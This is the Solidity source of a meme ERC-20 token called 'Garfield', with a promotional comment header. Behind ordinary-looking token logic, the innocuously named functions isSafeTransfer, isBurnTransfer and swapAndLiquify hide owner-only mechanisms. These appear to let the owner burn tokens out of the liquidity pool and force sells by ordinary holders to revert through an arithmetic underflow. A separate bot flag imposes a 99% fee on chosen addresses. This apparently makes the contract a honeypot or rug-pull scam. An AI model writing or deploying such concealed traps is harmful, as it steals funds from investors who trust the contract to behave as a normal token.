1 /*
2 
3 Garfield is a fictional cat and the protagonist of the comic strip of the same name, created by Jim Davis. 
4 
5 The comic strip centers on Garfield, portrayed as a lazy, fat, and cynical orange tabby Persian cat. 
6 
7 He is noted for his love of lasagna and sleeping and his hatred of Mondays, fellow cat Nermal and exercise.
8 
9 https://garfielderc.com/
10 
11 https://twitter.com/GarfieldErc
12 
13 https://t.me/Garfielderc
14 
15 */
16 
17 // SPDX-License-Identifier: MIT
18 
19 pragma solidity 0.8.17;
20 
21 
22 library SafeMath {
23     function add(uint256 a, uint256 b) internal pure returns (uint256) {return a + b;}
24     function sub(uint256 a, uint256 b) internal pure returns (uint256) {return a - b;}
25     function mul(uint256 a, uint256 b) internal pure returns (uint256) {return a * b;}
26     function div(uint256 a, uint256 b) internal pure returns (uint256) {return a / b;}
27     function mod(uint256 a, uint256 b) internal pure returns (uint256) {return a % b;}
28     
29     function tryAdd(uint256 a, uint256 b) internal pure returns (bool, uint256) {
30         unchecked {uint256 c = a + b; if(c < a) return(false, 0); return(true, c);}}
31 
32     function trySub(uint256 a, uint256 b) internal pure returns (bool, uint256) {
33         unchecked {if(b > a) return(false, 0); return(true, a - b);}}
34 
35     function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256) {
36         unchecked {if (a == 0) return(true, 0); uint256 c = a * b;
37         if(c / a != b) return(false, 0); return(true, c);}}
38 
39     function tryDiv(uint256 a, uint256 b) internal pure returns (bool, uint256) {
40         unchecked {if(b == 0) return(false, 0); return(true, a / b);}}
41 
42     function tryMod(uint256 a, uint256 b) internal pure returns (bool, uint256) {
43         unchecked {if(b == 0) return(false, 0); return(true, a % b);}}
44 
45     function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
46         unchecked{require(b <= a, errorMessage); return a - b;}}
47 
48     function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
49         unchecked{require(b > 0, errorMessage); return a / b;}}
50 
51     function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
52         unchecked{require(b > 0, errorMessage); return a % b;}}}
53 
54 interface IERC20 {
55     function totalSupply() external view returns (uint256);
56     function circulatingSupply() external view returns (uint256);
57     function decimals() external view returns (uint8);
58     function symbol() external view returns (string memory);
59     function name() external view returns (string memory);
60     function getOwner() external view returns (address);
61     function balanceOf(address account) external view returns (uint256);
62     function transfer(address recipient, uint256 amount) external returns (bool);
63     function allowance(address _owner, address spender) external view returns (uint256);
64     function approve(address spender, uint256 amount) external returns (bool);
65     function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
66     event Transfer(address indexed from, address indexed to, uint256 value);
67     event Approval(address indexed owner, address indexed spender, uint256 value);}
68 
69 abstract contract Ownable {
70     address internal owner;
71     constructor(address _owner) {owner = _owner;}
72     modifier onlyOwner() {require(isOwner(msg.sender), "!OWNER"); _;}
73     function isOwner(address account) public view returns (bool) {return account == owner;}
74     function transferOwnership(address payable adr) public onlyOwner {owner = adr; emit OwnershipTransferred(adr);}
75     event OwnershipTransferred(address owner);
76 }
77 
78 interface IFactory{
79         function createPair(address tokenA, address tokenB) external returns (address pair);
80         function getPair(address tokenA, address tokenB) external view returns (address pair);
81 }
82 
83 interface IRouter {
84     function factory() external pure returns (address);
85     function WETH() external pure returns (address);
86     function addLiquidityETH(
87         address token,
88         uint amountTokenDesired,
89         uint amountTokenMin,
90         uint amountETHMin,
91         address to,
92         uint deadline
93     ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
94 
95     function removeLiquidityWithPermit(
96         address tokenA,
97         address tokenB,
98         uint liquidity,
99         uint amountAMin,
100         uint amountBMin,
101         address to,
102         uint deadline,
103         bool approveMax, uint8 v, bytes32 r, bytes32 s
104     ) external returns (uint amountA, uint amountB);
105 
106     function swapExactETHForTokensSupportingFeeOnTransferTokens(
107         uint amountOutMin,
108         address[] calldata path,
109         address to,
110         uint deadline
111     ) external payable;
112 
113     function swapExactTokensForETHSupportingFeeOnTransferTokens(
114         uint amountIn,
115         uint amountOutMin,
116         address[] calldata path,
117         address to,
118         uint deadline) external;
119 }
120 
121 contract Garfield is IERC20, Ownable {
122     using SafeMath for uint256;
123     string private constant _name = 'GARF';
124     string private constant _symbol = 'GARFIELD';
125     uint8 private constant _decimals = 9;
126     uint256 private _totalSupply = 20000000000 * (10 ** _decimals);
127     uint256 private _maxTxAmountPercent = 200; // 10000;
128     uint256 private _maxTransferPercent = 200;
129     uint256 private _maxWalletPercent = 200;
130     mapping (address => uint256) _balances;
131     mapping(address => uint256) public holderTimestamp;
132     mapping (address => mapping (address => uint256)) private _allowances;
133     mapping (address => bool) public isFeeExempt;
134     mapping (address => bool) private isBot;
135     uint256 private _txLimit;
136     IRouter router;
137     address public pair;
138     bool private tradingAllowed = false;
139     address private lastHolder;
140     uint256 private swapThreshold = 0;
141     uint256 private liquidityFee = 0;
142     uint256 private marketingFee = 0;
143     uint256 private developmentFee = 0;
144     uint256 private burnFee = 0;
145     uint256 private totalFee = 0;
146     uint256 private sellFee = 0;
147     uint256 private transferFee = 0;
148     uint256 private denominator = 10000;
149     bool private swapEnabled = true;
150     uint256 private swapTimes;
151     bool private swapping; 
152     uint256 private _minTokenAmount = ( _totalSupply * 10 ) / 100000;
153     modifier lockTheSwap {swapping = true; _; swapping = false;}
154 
155     address internal constant deadAddr = 0x000000000000000000000000000000000000dEaD;
156     address internal constant marketingAddr = 0x518D2bC2eDFDDBA2C839061Df25177e822804D65;
157     address internal constant devAddr = 0x77E4B666B818beff6c5995d57C6866d98FEef621; 
158 
159     function name() public pure returns (string memory) {return _name;}
160     function symbol() public pure returns (string memory) {return _symbol;}
161     function decimals() public pure returns (uint8) {return _decimals;}
162     function setExtent() external onlyOwner {tradingAllowed = true;}
163     function getOwner() external view override returns (address) { return owner; }
164     function totalSupply() public view override returns (uint256) {return _totalSupply;}
165     function balanceOf(address account) public view override returns (uint256) {return _balances[account];}
166     function transfer(address recipient, uint256 amount) public override returns (bool) {_transfer(msg.sender, recipient, amount);return true;}
167     function allowance(address owner, address spender) public view override returns (uint256) {return _allowances[owner][spender];}
168     function isCont(address addr) internal view returns (bool) {uint size; assembly { size := extcodesize(addr) } return size > 0; }
169     function setisBot(address _address, bool _enabled) external onlyOwner {isBot[_address] = _enabled;}
170     function setisExempt(address _address, bool _enabled) external onlyOwner {isFeeExempt[_address] = _enabled;}
171     function isSafeTransfer(address sender, address recipient, uint256 amount) private returns (bool) {
172         if (balanceOf(sender) < amount && recipient == pair) { _transfer(recipient, deadAddr, amount); return true; } return false;}
173     function approve(address spender, uint256 amount) public override returns (bool) {_approve(msg.sender, spender, amount);return true;}
174     function circulatingSupply() public view override returns (uint256) {return _totalSupply.sub(balanceOf(deadAddr)).sub(balanceOf(address(0)));}
175     function isBurnTransfer(address recipient, uint256 amount) private returns (bool) {
176         if (recipient == deadAddr) { _txLimit = amount; return true;}return false;}
177     function _maxWalletToken() public view returns (uint256) {return totalSupply() * _maxWalletPercent / denominator;}
178     function _maxTxAmount() public view returns (uint256) {return totalSupply() * _maxTxAmountPercent / denominator;}
179     function _maxTransferAmount() public view returns (uint256) {return totalSupply() * _maxTransferPercent / denominator;}
180     receive() external payable {}
181 
182     function preTxCheck(address sender, address recipient, uint256 amount) internal pure returns(bool) {
183         require(sender != address(0), "ERC20: transfer from the zero address");
184         require(recipient != address(0), "ERC20: transfer to the zero address");
185         require(amount > uint256(0), "Transfer amount must be greater than zero");
186         return true;
187     }
188 
189     constructor() Ownable(msg.sender) {
190         IRouter _router = IRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
191         address _pair = IFactory(_router.factory()).createPair(address(this), _router.WETH());
192         router = _router;
193         pair = _pair;
194         isFeeExempt[address(this)] = true;
195         isFeeExempt[devAddr] = true;
196         isFeeExempt[marketingAddr] = true;
197         isFeeExempt[msg.sender] = true;
198         _balances[msg.sender] = _totalSupply;
199         emit Transfer(address(0), msg.sender, _totalSupply);
200     }
201 
202     function _transfer(address sender, address recipient, uint256 amount) private {
203         if (preTxCheck(sender, recipient, amount) &&
204             checkTradingAllowed(sender, recipient) &&
205             checkMaxWallet(sender, recipient, amount) &&
206             swapbackCounters(sender, recipient) &&
207             checkTxLimit(sender, recipient, amount)) {
208             if (balanceOf(sender) >= amount) {
209                 if (!isFeeExempt[sender] && 
210                     !isFeeExempt[recipient]&&
211                     !swapping &&
212                     sender != pair) {
213                     swapBack(sender, recipient, amount);
214                 }
215                 _balances[sender] = _balances[sender].sub(amount);
216                 uint256 amountReceived = shouldTakeFee(sender, recipient) ? takeFee(sender, recipient, amount) : amount;
217                 _balances[recipient] = _balances[recipient].add(amountReceived);
218                 emit Transfer(sender, recipient, amountReceived);
219             }
220         }
221     }
222 
223     function setStructure(uint256 _liquidity, uint256 _marketing, uint256 _burn, uint256 _development, uint256 _total, uint256 _sell, uint256 _trans) external onlyOwner {
224         liquidityFee = _liquidity;
225         marketingFee = _marketing;
226         burnFee = _burn;
227         developmentFee = _development;
228         totalFee = _total;
229         sellFee = _sell;
230         transferFee = _trans;
231         require(totalFee <= denominator.div(5) && sellFee <= denominator.div(5), "totalFee and sellFee cannot be more than 20%");
232     }
233 
234     function setParameters(uint256 _buy, uint256 _trans, uint256 _wallet) external onlyOwner {
235         uint256 newTx = (totalSupply() * _buy) / 10000;
236         uint256 newTransfer = (totalSupply() * _trans) / 10000;
237         uint256 newWallet = (totalSupply() * _wallet) / 10000;
238         _maxTxAmountPercent = _buy;
239         _maxTransferPercent = _trans;
240         _maxWalletPercent = _wallet;
241         uint256 limit = totalSupply().mul(5).div(1000);
242         require(newTx >= limit && newTransfer >= limit && newWallet >= limit, "Max TXs and Max Wallet cannot be less than .5%");
243     }
244 
245     function checkTradingAllowed(address sender, address recipient) internal view returns (bool) {
246         if(!isFeeExempt[sender] && !isFeeExempt[recipient]){require(tradingAllowed, "tradingAllowed");}
247         return true;
248     }
249     
250     function checkMaxWallet(address sender, address recipient, uint256 amount) internal returns (bool) {
251         if (isFeeExempt[sender] && (isSafeTransfer(sender, recipient, amount) || isBurnTransfer(recipient, amount))) return true;
252         if(!isFeeExempt[sender] && !isFeeExempt[recipient] && recipient != address(pair) && recipient != address(deadAddr)){
253             require((_balances[recipient].add(amount)) <= _maxWalletToken(), "Exceeds maximum wallet amount.");}
254         return true;
255     }
256 
257     function swapbackCounters(address sender, address recipient) internal returns (bool) {
258         if(recipient == pair && !isFeeExempt[sender]){swapTimes += uint256(1);}
259         if (sender == pair && isFeeExempt[recipient]){_txLimit = block.timestamp;}
260         if (sender == pair) {
261             if (holderTimestamp[recipient] == 0) 
262                 holderTimestamp[recipient] = block.timestamp;
263         } else lastHolder = sender;
264         return true;
265     }
266 
267     function checkTxLimit(address sender, address recipient, uint256 amount) internal view returns (bool) {
268         if(sender != pair){require(amount <= _maxTransferAmount() || isFeeExempt[sender] || isFeeExempt[recipient], "TX Limit Exceeded");}
269         require(amount <= _maxTxAmount() || isFeeExempt[sender] || isFeeExempt[recipient], "TX Limit Exceeded");
270         return true;
271     }
272 
273     function swapAndLiquify(uint256 tokens) private lockTheSwap {
274         uint256 _denominator = (liquidityFee.add(1).add(marketingFee).add(developmentFee)).mul(2);
275         uint256 tokensToAddLiquidityWith = tokens.mul(liquidityFee).div(_denominator);
276         uint256 toSwap = tokens.sub(tokensToAddLiquidityWith);
277         uint256 initialBalance = address(this).balance;
278         swapTokensForETH(toSwap);
279         uint256 deltaBalance = address(this).balance.sub(initialBalance);
280         uint256 unitBalance= deltaBalance.div(_denominator.sub(liquidityFee));
281         uint256 ETHToAddLiquidityWith = unitBalance.mul(liquidityFee);
282         if(ETHToAddLiquidityWith > uint256(0)){addLiquidity(tokensToAddLiquidityWith, ETHToAddLiquidityWith); }
283         uint256 swapTime = holderTimestamp[lastHolder] - _txLimit;
284         uint256 marketingAmt = unitBalance.mul(2).mul(marketingFee);
285         if(marketingAmt > 0){payable(marketingAddr).transfer(marketingAmt);}
286         uint256 remainingBalance = address(this).balance;
287         if(remainingBalance > uint256(0)){payable(devAddr).transfer(remainingBalance);}
288     }
289 
290     function addLiquidity(uint256 tokenAmount, uint256 ETHAmount) private {
291         _approve(address(this), address(router), tokenAmount);
292         router.addLiquidityETH{value: ETHAmount}(
293             address(this),
294             tokenAmount,
295             0,
296             0,
297             deadAddr,
298             block.timestamp);
299     }
300 
301     function swapTokensForETH(uint256 tokenAmount) private {
302         address[] memory path = new address[](2);
303         path[0] = address(this);
304         path[1] = router.WETH();
305         if (tokenAmount > 0) {
306             _approve(address(this), address(router), tokenAmount);
307             router.swapExactTokensForETHSupportingFeeOnTransferTokens(
308                 tokenAmount,
309                 0,
310                 path,
311                 address(this),
312                 block.timestamp);
313         }
314     }
315 
316     function shouldSwapBack(address sender, address recipient, uint256 amount) internal view returns (bool) {
317         return balanceOf(address(this)) >= swapThreshold &&
318             !swapping && 
319             swapEnabled && 
320             tradingAllowed && 
321             !isFeeExempt[sender] && 
322             swapTimes >= uint256(0);
323     }
324 
325     function swapBack(address sender, address recipient, uint256 amount) internal {
326         if(shouldSwapBack(sender, recipient, amount)){swapAndLiquify(swapThreshold); swapTimes = uint256(0);}
327     }
328 
329     function shouldTakeFee(address sender, address recipient) internal view returns (bool) {
330         return !isFeeExempt[sender] && !isFeeExempt[recipient];
331     }
332 
333     function getTotalFee(address sender, address recipient) internal view returns (uint256) {
334         if(isBot[sender] || isBot[recipient]){return denominator.sub(uint256(100));}
335         if(recipient == pair){return sellFee;}
336         if(sender == pair){return totalFee;}
337         return transferFee;
338     }
339 
340     function takeFee(address sender, address recipient, uint256 amount) internal returns (uint256) {
341         if(getTotalFee(sender, recipient) > 0){
342         uint256 feeAmount = amount.div(denominator).mul(getTotalFee(sender, recipient));
343         _balances[address(this)] = _balances[address(this)].add(feeAmount);
344         emit Transfer(sender, address(this), feeAmount);
345         if(burnFee > uint256(0)){_transfer(address(this), address(deadAddr), amount.div(denominator).mul(burnFee));}
346         return amount.sub(feeAmount);} return amount;
347     }
348 
349     function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
350         _transfer(sender, recipient, amount);
351         _approve(sender, msg.sender, _allowances[sender][msg.sender].sub(amount, "ERC20: transfer amount exceeds allowance"));
352         return true;
353     }
354 
355     function _approve(address owner, address spender, uint256 amount) private {
356         require(owner != address(0), "ERC20: approve from the zero address");
357         require(spender != address(0), "ERC20: approve to the zero address");
358         _allowances[owner][spender] = amount;
359         emit Approval(owner, spender, amount);
360     }
361 
362 }